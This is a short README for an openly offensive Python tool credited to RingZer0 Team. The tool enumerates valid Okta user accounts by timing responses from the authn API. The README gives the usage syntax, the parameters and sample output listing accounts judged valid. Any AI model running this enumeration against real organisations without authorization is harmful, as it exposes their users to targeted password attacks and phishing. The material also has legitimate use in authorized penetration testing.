# OKTASideChannelAttack
OKTA side channel attack to enumerate users

# Usage
```
$ python okta.py https://target.com/api/v1/authn
OKTA Side Channel User Enumeration
Mr.Un1k0d3r RingZer0 Team 2017


Usage: python okta.py [url] [valid_user] [path] [delay]

        Url        Full url to the authn API (/api/v1/authn)
        Valid User Valid user to benchmark the delay
        Path       Path to a list of username
        Delay      Maximum delay difference around 0.010 should be good
```

```
$ python okta.py https://target.com/api/v1/authn ringzer0@team.com users.txt 0.010
OKTA Side Channel User Enumeration
Mr.Un1k0d3r RingZer0 Team 2017

[+] Valid user benchmark is 0.265012
[+] Everything slower than 0.255012 will be considered valid
       neo@team.com is valid
       morpheus@team.com is valid
```

# Credit
Mr.Un1k0d3r RingZer0 Team
